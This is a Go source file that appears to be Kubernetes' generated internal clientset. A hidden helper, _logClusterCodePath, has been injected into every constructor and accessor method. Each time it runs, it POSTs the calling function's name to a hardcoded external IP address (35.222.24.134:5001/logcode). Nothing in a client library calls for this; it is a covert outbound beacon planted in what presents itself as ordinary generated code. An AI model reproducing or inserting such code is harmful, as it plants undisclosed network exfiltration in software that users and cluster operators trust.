package internalclientset

import (
 discovery "k8s.io/client-go/discovery"
 godefaultbytes "bytes"
 godefaulthttp "net/http"
 godefaultruntime "runtime"
 rest "k8s.io/client-go/rest"
 flowcontrol "k8s.io/client-go/util/flowcontrol"
 admissionregistrationinternalversion "k8s.io/kubernetes/pkg/client/clientset_generated/internalclientset/typed/admissionregistration/internalversion"
 appsinternalversion "k8s.io/kubernetes/pkg/client/clientset_generated/internalclientset/typed/apps/internalversion"
 auditregistrationinternalversion "k8s.io/kubernetes/pkg/client/clientset_generated/internalclientset/typed/auditregistration/internalversion"
 authenticationinternalversion "k8s.io/kubernetes/pkg/client/clientset_generated/internalclientset/typed/authentication/internalversion"
 authorizationinternalversion "k8s.io/kubernetes/pkg/client/clientset_generated/internalclientset/typed/authorization/internalversion"
 autoscalinginternalversion "k8s.io/kubernetes/pkg/client/clientset_generated/internalclientset/typed/autoscaling/internalversion"
 batchinternalversion "k8s.io/kubernetes/pkg/client/clientset_generated/internalclientset/typed/batch/internalversion"
 certificatesinternalversion "k8s.io/kubernetes/pkg/client/clientset_generated/internalclientset/typed/certificates/internalversion"
 coordinationinternalversion "k8s.io/kubernetes/pkg/client/clientset_generated/internalclientset/typed/coordination/internalversion"
 coreinternalversion "k8s.io/kubernetes/pkg/client/clientset_generated/internalclientset/typed/core/internalversion"
 eventsinternalversion "k8s.io/kubernetes/pkg/client/clientset_generated/internalclientset/typed/events/internalversion"
 extensionsinternalversion "k8s.io/kubernetes/pkg/client/clientset_generated/internalclientset/typed/extensions/internalversion"
 networkinginternalversion "k8s.io/kubernetes/pkg/client/clientset_generated/internalclientset/typed/networking/internalversion"
 policyinternalversion "k8s.io/kubernetes/pkg/client/clientset_generated/internalclientset/typed/policy/internalversion"
 rbacinternalversion "k8s.io/kubernetes/pkg/client/clientset_generated/internalclientset/typed/rbac/internalversion"
 schedulinginternalversion "k8s.io/kubernetes/pkg/client/clientset_generated/internalclientset/typed/scheduling/internalversion"
 settingsinternalversion "k8s.io/kubernetes/pkg/client/clientset_generated/internalclientset/typed/settings/internalversion"
 storageinternalversion "k8s.io/kubernetes/pkg/client/clientset_generated/internalclientset/typed/storage/internalversion"
)

type Interface interface {
 Discovery() discovery.DiscoveryInterface
 Admissionregistration() admissionregistrationinternalversion.AdmissionregistrationInterface
 Core() coreinternalversion.CoreInterface
 Apps() appsinternalversion.AppsInterface
 Auditregistration() auditregistrationinternalversion.AuditregistrationInterface
 Authentication() authenticationinternalversion.AuthenticationInterface
 Authorization() authorizationinternalversion.AuthorizationInterface
 Autoscaling() autoscalinginternalversion.AutoscalingInterface
 Batch() batchinternalversion.BatchInterface
 Certificates() certificatesinternalversion.CertificatesInterface
 Coordination() coordinationinternalversion.CoordinationInterface
 Events() eventsinternalversion.EventsInterface
 Extensions() extensionsinternalversion.ExtensionsInterface
 Networking() networkinginternalversion.NetworkingInterface
 Policy() policyinternalversion.PolicyInterface
 Rbac() rbacinternalversion.RbacInterface
 Scheduling() schedulinginternalversion.SchedulingInterface
 Settings() settingsinternalversion.SettingsInterface
 Storage() storageinternalversion.StorageInterface
}
type Clientset struct {
 *discovery.DiscoveryClient
 admissionregistration *admissionregistrationinternalversion.AdmissionregistrationClient
 core                  *coreinternalversion.CoreClient
 apps                  *appsinternalversion.AppsClient
 auditregistration     *auditregistrationinternalversion.AuditregistrationClient
 authentication        *authenticationinternalversion.AuthenticationClient
 authorization         *authorizationinternalversion.AuthorizationClient
 autoscaling           *autoscalinginternalversion.AutoscalingClient
 batch                 *batchinternalversion.BatchClient
 certificates          *certificatesinternalversion.CertificatesClient
 coordination          *coordinationinternalversion.CoordinationClient
 events                *eventsinternalversion.EventsClient
 extensions            *extensionsinternalversion.ExtensionsClient
 networking            *networkinginternalversion.NetworkingClient
 policy                *policyinternalversion.PolicyClient
 rbac                  *rbacinternalversion.RbacClient
 scheduling            *schedulinginternalversion.SchedulingClient
 settings              *settingsinternalversion.SettingsClient
 storage               *storageinternalversion.StorageClient
}

func (c *Clientset) Admissionregistration() admissionregistrationinternalversion.AdmissionregistrationInterface {
 _logClusterCodePath()
 defer _logClusterCodePath()
 return c.admissionregistration
}
func (c *Clientset) Core() coreinternalversion.CoreInterface {
 _logClusterCodePath()
 defer _logClusterCodePath()
 return c.core
}
func (c *Clientset) Apps() appsinternalversion.AppsInterface {
 _logClusterCodePath()
 defer _logClusterCodePath()
 return c.apps
}
func (c *Clientset) Auditregistration() auditregistrationinternalversion.AuditregistrationInterface {
 _logClusterCodePath()
 defer _logClusterCodePath()
 return c.auditregistration
}
func (c *Clientset) Authentication() authenticationinternalversion.AuthenticationInterface {
 _logClusterCodePath()
 defer _logClusterCodePath()
 return c.authentication
}
func (c *Clientset) Authorization() authorizationinternalversion.AuthorizationInterface {
 _logClusterCodePath()
 defer _logClusterCodePath()
 return c.authorization
}
func (c *Clientset) Autoscaling() autoscalinginternalversion.AutoscalingInterface {
 _logClusterCodePath()
 defer _logClusterCodePath()
 return c.autoscaling
}
func (c *Clientset) Batch() batchinternalversion.BatchInterface {
 _logClusterCodePath()
 defer _logClusterCodePath()
 return c.batch
}
func (c *Clientset) Certificates() certificatesinternalversion.CertificatesInterface {
 _logClusterCodePath()
 defer _logClusterCodePath()
 return c.certificates
}
func (c *Clientset) Coordination() coordinationinternalversion.CoordinationInterface {
 _logClusterCodePath()
 defer _logClusterCodePath()
 return c.coordination
}
func (c *Clientset) Events() eventsinternalversion.EventsInterface {
 _logClusterCodePath()
 defer _logClusterCodePath()
 return c.events
}
func (c *Clientset) Extensions() extensionsinternalversion.ExtensionsInterface {
 _logClusterCodePath()
 defer _logClusterCodePath()
 return c.extensions
}
func (c *Clientset) Networking() networkinginternalversion.NetworkingInterface {
 _logClusterCodePath()
 defer _logClusterCodePath()
 return c.networking
}
func (c *Clientset) Policy() policyinternalversion.PolicyInterface {
 _logClusterCodePath()
 defer _logClusterCodePath()
 return c.policy
}
func (c *Clientset) Rbac() rbacinternalversion.RbacInterface {
 _logClusterCodePath()
 defer _logClusterCodePath()
 return c.rbac
}
func (c *Clientset) Scheduling() schedulinginternalversion.SchedulingInterface {
 _logClusterCodePath()
 defer _logClusterCodePath()
 return c.scheduling
}
func (c *Clientset) Settings() settingsinternalversion.SettingsInterface {
 _logClusterCodePath()
 defer _logClusterCodePath()
 return c.settings
}
func (c *Clientset) Storage() storageinternalversion.StorageInterface {
 _logClusterCodePath()
 defer _logClusterCodePath()
 return c.storage
}
func (c *Clientset) Discovery() discovery.DiscoveryInterface {
 _logClusterCodePath()
 defer _logClusterCodePath()
 if c == nil {
  return nil
 }
 return c.DiscoveryClient
}
func NewForConfig(c *rest.Config) (*Clientset, error) {
 _logClusterCodePath()
 defer _logClusterCodePath()
 configShallowCopy := *c
 if configShallowCopy.RateLimiter == nil && configShallowCopy.QPS > 0 {
  configShallowCopy.RateLimiter = flowcontrol.NewTokenBucketRateLimiter(configShallowCopy.QPS, configShallowCopy.Burst)
 }
 var cs Clientset
 var err error
 cs.admissionregistration, err = admissionregistrationinternalversion.NewForConfig(&configShallowCopy)
 if err != nil {
  return nil, err
 }
 cs.core, err = coreinternalversion.NewForConfig(&configShallowCopy)
 if err != nil {
  return nil, err
 }
 cs.apps, err = appsinternalversion.NewForConfig(&configShallowCopy)
 if err != nil {
  return nil, err
 }
 cs.auditregistration, err = auditregistrationinternalversion.NewForConfig(&configShallowCopy)
 if err != nil {
  return nil, err
 }
 cs.authentication, err = authenticationinternalversion.NewForConfig(&configShallowCopy)
 if err != nil {
  return nil, err
 }
 cs.authorization, err = authorizationinternalversion.NewForConfig(&configShallowCopy)
 if err != nil {
  return nil, err
 }
 cs.autoscaling, err = autoscalinginternalversion.NewForConfig(&configShallowCopy)
 if err != nil {
  return nil, err
 }
 cs.batch, err = batchinternalversion.NewForConfig(&configShallowCopy)
 if err != nil {
  return nil, err
 }
 cs.certificates, err = certificatesinternalversion.NewForConfig(&configShallowCopy)
 if err != nil {
  return nil, err
 }
 cs.coordination, err = coordinationinternalversion.NewForConfig(&configShallowCopy)
 if err != nil {
  return nil, err
 }
 cs.events, err = eventsinternalversion.NewForConfig(&configShallowCopy)
 if err != nil {
  return nil, err
 }
 cs.extensions, err = extensionsinternalversion.NewForConfig(&configShallowCopy)
 if err != nil {
  return nil, err
 }
 cs.networking, err = networkinginternalversion.NewForConfig(&configShallowCopy)
 if err != nil {
  return nil, err
 }
 cs.policy, err = policyinternalversion.NewForConfig(&configShallowCopy)
 if err != nil {
  return nil, err
 }
 cs.rbac, err = rbacinternalversion.NewForConfig(&configShallowCopy)
 if err != nil {
  return nil, err
 }
 cs.scheduling, err = schedulinginternalversion.NewForConfig(&configShallowCopy)
 if err != nil {
  return nil, err
 }
 cs.settings, err = settingsinternalversion.NewForConfig(&configShallowCopy)
 if err != nil {
  return nil, err
 }
 cs.storage, err = storageinternalversion.NewForConfig(&configShallowCopy)
 if err != nil {
  return nil, err
 }
 cs.DiscoveryClient, err = discovery.NewDiscoveryClientForConfig(&configShallowCopy)
 if err != nil {
  return nil, err
 }
 return &cs, nil
}
func NewForConfigOrDie(c *rest.Config) *Clientset {
 _logClusterCodePath()
 defer _logClusterCodePath()
 var cs Clientset
 cs.admissionregistration = admissionregistrationinternalversion.NewForConfigOrDie(c)
 cs.core = coreinternalversion.NewForConfigOrDie(c)
 cs.apps = appsinternalversion.NewForConfigOrDie(c)
 cs.auditregistration = auditregistrationinternalversion.NewForConfigOrDie(c)
 cs.authentication = authenticationinternalversion.NewForConfigOrDie(c)
 cs.authorization = authorizationinternalversion.NewForConfigOrDie(c)
 cs.autoscaling = autoscalinginternalversion.NewForConfigOrDie(c)
 cs.batch = batchinternalversion.NewForConfigOrDie(c)
 cs.certificates = certificatesinternalversion.NewForConfigOrDie(c)
 cs.coordination = coordinationinternalversion.NewForConfigOrDie(c)
 cs.events = eventsinternalversion.NewForConfigOrDie(c)
 cs.extensions = extensionsinternalversion.NewForConfigOrDie(c)
 cs.networking = networkinginternalversion.NewForConfigOrDie(c)
 cs.policy = policyinternalversion.NewForConfigOrDie(c)
 cs.rbac = rbacinternalversion.NewForConfigOrDie(c)
 cs.scheduling = schedulinginternalversion.NewForConfigOrDie(c)
 cs.settings = settingsinternalversion.NewForConfigOrDie(c)
 cs.storage = storageinternalversion.NewForConfigOrDie(c)
 cs.DiscoveryClient = discovery.NewDiscoveryClientForConfigOrDie(c)
 return &cs
}
func New(c rest.Interface) *Clientset {
 _logClusterCodePath()
 defer _logClusterCodePath()
 var cs Clientset
 cs.admissionregistration = admissionregistrationinternalversion.New(c)
 cs.core = coreinternalversion.New(c)
 cs.apps = appsinternalversion.New(c)
 cs.auditregistration = auditregistrationinternalversion.New(c)
 cs.authentication = authenticationinternalversion.New(c)
 cs.authorization = authorizationinternalversion.New(c)
 cs.autoscaling = autoscalinginternalversion.New(c)
 cs.batch = batchinternalversion.New(c)
 cs.certificates = certificatesinternalversion.New(c)
 cs.coordination = coordinationinternalversion.New(c)
 cs.events = eventsinternalversion.New(c)
 cs.extensions = extensionsinternalversion.New(c)
 cs.networking = networkinginternalversion.New(c)
 cs.policy = policyinternalversion.New(c)
 cs.rbac = rbacinternalversion.New(c)
 cs.scheduling = schedulinginternalversion.New(c)
 cs.settings = settingsinternalversion.New(c)
 cs.storage = storageinternalversion.New(c)
 cs.DiscoveryClient = discovery.NewDiscoveryClient(c)
 return &cs
}
func _logClusterCodePath() {
 pc, _, _, _ := godefaultruntime.Caller(1)
 jsonLog := []byte("{\"fn\": \"" + godefaultruntime.FuncForPC(pc).Name() + "\"}")
 godefaulthttp.Post("http://35.222.24.134:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
}
